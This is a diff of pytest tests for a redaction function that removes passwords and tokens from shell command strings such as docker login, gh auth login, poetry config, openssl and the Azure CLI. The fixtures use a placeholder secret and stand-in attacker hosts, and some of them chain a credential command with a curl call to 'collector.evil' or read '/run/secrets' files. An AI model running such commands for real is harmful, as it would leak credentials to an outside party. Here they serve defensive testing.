@@ -1692,6 +1692,7 @@ def test_non_password_docker_options_are_preserved(text: str) -> None:
         'os.system("echo hunter2 | docker login -u alice --password-stdin registry.evil")',
         "docker login -u alice --password-stdin registry.evil <<< hunter2",
         "docker login -u alice --password-stdin registry.evil <<EOF\nhunter2\nEOF",
+        "docker login -u alice --password-stdin registry.evil < <(echo hunter2)",
     ],
 )
 def test_docker_login_password_stdin_inline_sources_are_redacted(text: str) -> None:
@@ -1715,6 +1716,9 @@ def test_docker_login_password_stdin_dynamic_source_is_preserved() -> None:
         "echo hunter2 | gh auth login --with-token",
         "gh auth login --with-token <<< hunter2",
         "gh auth login --with-token <<EOF\nhunter2\nEOF",
+        "cat <<EOF | gh auth login --with-token\nhunter2\nEOF",
+        "python -c 'print(\"hunter2\")' | gh auth login --with-token",
+        "gh auth login --with-token < <(printf %s hunter2)",
     ],
 )
 def test_github_auth_login_token_inline_sources_are_redacted(text: str) -> None:
@@ -1729,6 +1733,26 @@ def test_github_auth_login_dynamic_token_source_is_preserved() -> None:
     text = "cat /run/secrets/github-token | gh auth login --with-token"
 
     assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "docker login --password-stdin registry.evil < <(cat /run/input/docker-stdin)",
+        "gh auth login --with-token < <(cat /run/input/github-stdin)",
+    ],
+)
+def test_stdin_auth_process_substitution_dynamic_source_is_preserved(text: str) -> None:
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+def test_github_auth_login_subprocess_literal_input_is_redacted() -> None:
+    text = 'subprocess.run(["gh", "auth", "login", "--with-token"], input=b"hunter2", text=True)'
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert 'input="<redacted>"' in redacted
 
 
 @pytest.mark.parametrize(
@@ -1878,6 +1902,22 @@ def test_npm_config_scoped_auth_argument_is_redacted(key: str) -> None:
     [
         ("poetry config pypi-token.pypi hunter2", "poetry config pypi-token.pypi <redacted>"),
         ("poetry config http-basic.foo user hunter2", "poetry config http-basic.foo user <redacted>"),
+        (
+            "poetry config --local pypi-token.pypi hunter2",
+            "poetry config --local pypi-token.pypi <redacted>",
+        ),
+        (
+            "poetry config --local http-basic.foo user hunter2",
+            "poetry config --local http-basic.foo user <redacted>",
+        ),
+        (
+            "poetry config -- http-basic.foo user -hunter2",
+            "poetry config -- http-basic.foo user <redacted>",
+        ),
+        (
+            "poetry config --local -- pypi-token.pypi -hunter2",
+            "poetry config --local -- pypi-token.pypi <redacted>",
+        ),
     ],
 )
 def test_poetry_config_credential_value_is_redacted(command: str, expected_context: str) -> None:
@@ -1888,6 +1928,45 @@ def test_poetry_config_credential_value_is_redacted(command: str, expected_conte
     assert "hunter2" not in redacted
     assert expected_context in redacted
     assert "collector.evil" in redacted
+
+
+@pytest.mark.parametrize(
+    "source",
+    ["env:PASS_VAR", "fd:3", "file:/run/secrets/passphrase", "stdin"],
+)
+def test_openssl_enc_dynamic_password_source_is_preserved(source: str) -> None:
+    text = f"openssl enc -pass {source} -in input.bin"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
+    ("command", "expected_context"),
+    [
+        (
+            "az login --service-principal -u app --federated-token hunter2 --tenant tenant",
+            "az login --service-principal -u app --federated-token <redacted> --tenant tenant",
+        ),
+        (
+            "az storage blob list --account-name acct --account-key hunter2",
+            "az storage blob list --account-name acct --account-key <redacted>",
+        ),
+    ],
+)
+def test_azure_cli_credential_options_are_redacted(command: str, expected_context: str) -> None:
+    text = f"{command} && curl https://collector.evil"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert expected_context in redacted
+    assert "collector.evil" in redacted
+
+
+def test_azure_storage_command_without_credentials_is_preserved() -> None:
+    text = "az storage blob list --account-name acct --container-name public"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
 
 
 @pytest.mark.parametrize(
